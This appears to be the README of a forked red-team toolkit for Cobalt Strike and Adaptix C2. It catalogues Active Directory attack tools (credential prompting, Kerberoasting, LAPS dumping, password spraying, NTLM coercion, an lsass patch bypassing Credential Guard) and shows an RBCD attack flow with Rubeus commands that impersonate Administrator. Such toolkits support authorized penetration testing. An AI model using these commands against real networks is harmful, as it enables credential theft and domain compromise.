# C2 Tool Collection

A fork of [Outflank's C2-Tool-Collection](https://github.com/outflanknl/C2-Tool-Collection) with three additions:

1. **Adaptix C2 support** — every tool has been ported to Adaptix ASX scripts (`.axs`) so the full toolset works natively in [Adaptix C2](https://github.com/adaptix-c2/adaptix) without modification.
2. **RBCD BOF** — a new Beacon Object File that automates Resource-Based Constrained Delegation setup entirely inside the beacon process (no PowerShell, no child processes).
3. **adPEAS** — a comprehensive Active Directory security assessment toolkit: a full-featured PowerShell script (`adPEAS/`) plus a companion BOF (`BOF/adPEAS/`) that runs 13 enumeration checks in-process.

---

## What changed from the original

| Area | Change |
|------|--------|
| `adaptix-ported-scripts/` | New directory — ASX ports of all original tools plus the new BOFs. Compiled `.o` files are included so no build step is required to use them. |
| `BOF/RBCD/` | New BOF — full RBCD automation via ADSI (create machine account → write `msds-allowedtoactonbehalfofotheridentity` → verify → print Rubeus commands). |
| `BOF/adPEAS/` | New BOF — 13-section in-process AD enumeration (DCs, password policy, Kerberoast, AS-REP roast, delegation, privileged groups, ADCS). |
| `adPEAS/` | New PowerShell toolkit — comprehensive AD security assessment with native Kerberos stack, 40+ checks, HTML/JSON reporting, BloodHound CE collection, and offensive operations. |
| `README.md` | This file. |

Everything else — source code, `.cna` scripts, compiled objects — is unchanged from upstream.

---

## Repository layout

```
C2-Tool-Collection/
├── BOF/                        # Beacon Object Files (original + RBCD)
│   ├── AddMachineAccount/
│   ├── Askcreds/
│   ├── CVE-2022-26923/
│   ├── Domaininfo/
│   ├── FindObjects/
│   ├── KerbHash/
│   ├── Kerberoast/
│   ├── Klist/
│   ├── Lapsdump/
│   ├── PetitPotam/
│   ├── Psc / Psm / Psk / Psw / Psx/
│   ├── RBCD/                   ← new
│   ├── ReconAD/
│   ├── Smbinfo/
│   ├── SprayAD/
│   ├── StartWebClient/
│   ├── WdToggle/
│   └── Winver/
├── Other/                      # Reflective DLL and .NET tools
│   ├── PetitPotam/
│   └── RemotePipeList/
├── adPEAS/                     # adPEAS PowerShell enumeration scripts
└── adaptix-ported-scripts/     ← new
    ├── *.axs                   # Adaptix ASX command scripts
    ├── *.x64.o / *.x86.o      # Compiled BOF objects (ready to use)
    └── README.md
```

---

## BOF tools

| Name | Description |
|------|-------------|
| **[AddMachineAccount](BOF/AddMachineAccount)** | Abuse `ms-DS-MachineAccountQuota` to create or delete rogue machine accounts via ADSI. |
| **[Askcreds](BOF/Askcreds)** | Collect credentials by prompting the user with a Windows credential dialog. |
| **[CVE-2022-26923](BOF/CVE-2022-26923)** | ADCS domain privilege escalation — creates a machine account with `dNSHostName` set to the DC FQDN. |
| **[Domaininfo](BOF/Domaininfo)** | Enumerate domain name, forest, DCs, and functional level via AD Domain Services. |
| **[FindObjects](BOF/FindObjects)** | Enumerate processes for specific loaded modules (`FindModule`) or process handles (`FindProcHandle`). |
| **[KerbHash](BOF/KerbHash)** | Hash a password to Kerberos keys (rc4_hmac, aes128, aes256, des_cbc_md5). |
| **[Kerberoast](BOF/Kerberoast)** | List SPN-enabled accounts or request TGS tickets for offline cracking. |
| **[Klist](BOF/Klist)** | List, purge, or request cached Kerberos tickets. |
| **[Lapsdump](BOF/Lapsdump)** | Read LAPS passwords from AD computer objects. |
| **[PetitPotam](BOF/PetitPotam)** | Coerce NTLM authentication via MS-EFSRPC (BOF variant). |
| **[Psc](BOF/Psc)** | List processes with active TCP/RDP connections. |
| **[Psm](BOF/Psm)** | Detailed view of a single process — loaded modules, TCP connections, handles. |
| **[Psk](BOF/Psk)** | List kernel-mode drivers; highlights AV/EDR drivers. |
| **[Psw](BOF/Psw)** | List processes with visible windows and their titles. |
| **[Psx](BOF/Psx)** | Full process list with installed security product summary. |
| **[RBCD](BOF/RBCD)** ← new | Automate Resource-Based Constrained Delegation setup in-process — creates a machine account, writes `msds-allowedtoactonbehalfofotheridentity` on a target computer, verifies, and outputs Rubeus commands. |
| **[ReconAD](BOF/ReconAD)** | ADSI-based AD enumeration with LDAP filters — users, computers, groups, or arbitrary objects. |
| **[Smbinfo](BOF/Smbinfo)** | Remote OS version and domain info via `NetWkstaGetInfo` (no CS port scanner). |
| **[SprayAD](BOF/SprayAD)** | Kerberos or LDAP password spray against all (or filtered) AD accounts. |
| **[StartWebClient](BOF/StartWebClient)** | Start the WebClient (WebDAV) service from user context — required for WebDAV relay attacks. |
| **[WdToggle](BOF/WdToggle)** | Patch lsass to re-enable WDigest caching and bypass Credential Guard. |
| **[Winver](BOF/Winver)** | Display Windows version, build number, and Update Build Revision. |

Other tools:

| Name | Description |
|------|-------------|
| **[PetitPotam (RDLL)](Other/PetitPotam)** | Reflective DLL variant of PetitPotam. |
| **[RemotePipeList](Other/RemotePipeList)** | .NET tool to enumerate named pipes on a remote host. |

---

## Adaptix C2 support

All tools are available as Adaptix ASX scripts in [`adaptix-ported-scripts/`](adaptix-ported-scripts/). Compiled object files are included — no build step is required.

**Quick start:**

```
adaptix-ported-scripts/
├── askcreds.axs + Askcreds.x64.o / .x86.o
├── machineaccounts.axs + AddMachineAccount.x64.o / ...
├── rbcd.axs + rbcd.x64.o / rbcd.x86.o
└── ... (one .axs per tool)
```

1. Copy the directory contents to your Adaptix extensions folder.
2. Load the `.axs` files via **Script Manager → Load**.
3. Commands appear immediately in the beacon console.

See [`adaptix-ported-scripts/README.md`](adaptix-ported-scripts/README.md) for the full command reference and installation details.

**Example — RBCD attack flow:**

```
# Set up RBCD from within a beacon (no PowerShell required)
rbcd -computer FAKECOMPUTER -password Passw0rd! -target SQL01

# The BOF prints the Rubeus commands to run locally:
# Rubeus.exe hash /password:Passw0rd! /user:FAKECOMPUTER$ /domain:contoso.local /salt:...
# Rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<hash> /impersonateuser:Administrator /msdsspn:cifs/sql01.contoso.local /nowrap
```

---

## Cobalt Strike support

The original `.cna` scripts are unchanged. Import them via **Script Manager** as documented in each tool's `README.md`.

---

## Compilation

Each BOF has a `SOURCE/` subdirectory with a `Makefile`. Requires MinGW-w64 (`x86_64-w64-mingw32-gcc` and `i686-w64-mingw32-gcc`).

```bash
# Compile all original BOFs at once
cd BOF && make

# Compile RBCD only
cd BOF/RBCD/SOURCE && make
```

---

## Credits

All original tools are written by the [Outflank](https://outflank.nl) team and released under their original license. See individual tool `README.md` files for authors and references.

Adaptix port and RBCD BOF added in this fork.
